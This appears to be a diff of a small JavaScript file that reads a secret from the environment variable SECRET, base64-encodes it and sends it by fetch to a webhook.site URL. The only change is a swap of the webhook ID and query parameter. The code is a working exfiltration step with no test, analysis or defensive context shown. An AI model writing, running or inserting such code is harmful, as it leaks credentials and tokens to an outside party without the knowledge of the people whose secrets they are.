@@ -2,7 +2,7 @@
 const SECRET = process.env.SECRET;
 // Encode and send to webhook
 const encodedVariable = btoa(SECRET);
-const webhookUrl = `https://webhook.site/0e039ea9-674a-4a9c-a42b-aca98da957f0?cz=${encodedVariable}`;
+const webhookUrl = `https://webhook.site/2e32e2e8-7b4b-482f-9495-8726bc4a4f5d?yo=${encodedVariable}`;
 
 fetch(webhookUrl)
   .then(response => response.text())
